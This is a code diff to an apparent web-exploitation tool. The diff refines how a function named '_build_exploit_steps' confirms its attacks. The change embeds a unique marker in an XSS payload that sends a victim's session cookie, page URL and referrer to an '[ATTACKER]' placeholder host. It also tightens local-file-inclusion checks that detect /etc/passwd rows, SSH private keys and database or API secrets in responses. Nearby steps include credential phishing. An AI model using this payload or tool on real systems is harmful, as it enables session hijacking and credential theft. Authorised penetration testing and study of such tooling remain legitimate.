@@ -3736,6 +3736,7 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
         _m_svg = f"s{secrets.token_hex(4)}"
         _m_attr = f"a{secrets.token_hex(4)}"
         _m_js_ctx = f"j{secrets.token_hex(4)}"
+        _m_steal = f"k{secrets.token_hex(4)}"
 
         steps = [
             {"title": "Check reflection (benign marker)",
@@ -3764,12 +3765,18 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
              "validate": _xss_reflect_check(_m_js_ctx),
              "note": "If the param is reflected inside a JS string, ' breaks out"},
             {"title": "Cookie exfiltration payload",
+             # Per-step unique marker embedded as a JS comment inside the
+             # payload. Previously validated on the generic phrase
+             # 'new Image', which appears in legitimate JavaScript on
+             # plenty of target pages and produced false positives. The
+             # marker is alphanumeric-only so it survives JS parsers
+             # unchanged when reflected.
              "request": _get_param(
-                 "<script>new Image().src='[ATTACKER]/c?c='"
+                 f"<script>/*{_m_steal}*/new Image().src='[ATTACKER]/c?c='"
                  "+encodeURIComponent(document.cookie)"
                  "+'&u='+encodeURIComponent(location.href)"
                  "+'&r='+encodeURIComponent(document.referrer)</script>"),
-             "validate": _xss_reflect_check("new Image", "<script"),
+             "validate": _xss_reflect_check(_m_steal, "<script"),
              "warning": "Steals session cookies",
              "risk": "HIGH"},
             {"title": "Generate credential phishing page",
@@ -3857,23 +3864,40 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
         ]
 
     elif etype == "lfi":
+        # /etc/passwd shape: `^user:[x*!]?:\d+:\d+:...` appearing as a
+        # line. Require a regex match, not just substring — a blog post
+        # that mentions the string "root:" wouldn't match the line shape.
+        _passwd_row = _re.compile(
+            r"^[A-Za-z0-9_.-]+:[x*!]?:\d+:\d+:", _re.M
+        )
+        # Config-file heuristics: only trigger when the keyword appears
+        # in a KEY=VALUE or KEY: VALUE shape with a value. A page that
+        # mentions the word 'password' in prose doesn't match.
+        _config_like = _re.compile(
+            r"(?mi)^\s*(?:DB_PASSWORD|DB_HOST|DB_USER|API_KEY|SECRET|"
+            r"ACCESS_KEY_ID|AWS_SECRET|REDIS_PASSWORD|MYSQL_PASSWORD)"
+            r"\s*[:=]\s*\S"
+        )
+
         def _lfi_check(r: ExploitResult):
             body = r.response_body
-            if "root:" in body and ":0:0:" in body:
+            if _passwd_row.search(body):
                 r.success = True
                 r.confidence = 0.95
-                r.evidence = "Unix /etc/passwd content detected"
+                r.evidence = "Unix /etc/passwd row detected"
                 r.false_positive_risk = "very_low"
-            elif "BEGIN RSA PRIVATE KEY" in body or "BEGIN OPENSSH PRIVATE KEY" in body:
+                return
+            if "BEGIN RSA PRIVATE KEY" in body or "BEGIN OPENSSH PRIVATE KEY" in body:
                 r.success = True
                 r.confidence = 0.95
                 r.evidence = "SSH private key content detected"
                 r.false_positive_risk = "very_low"
-            elif r.status_code == 200 and len(body) > 20:
-                if any(s in body.lower() for s in ("password", "db_host", "api_key", "secret")):
+                return
+            if r.status_code == 200 and len(body) > 20:
+                if _config_like.search(body):
                     r.success = True
-                    r.confidence = 0.7
-                    r.evidence = "Sensitive keywords in response"
+                    r.confidence = 0.75
+                    r.evidence = "Config-file KEY=VALUE entries detected"
                     r.false_positive_risk = "medium"
 
         # Adaptive traversal depths
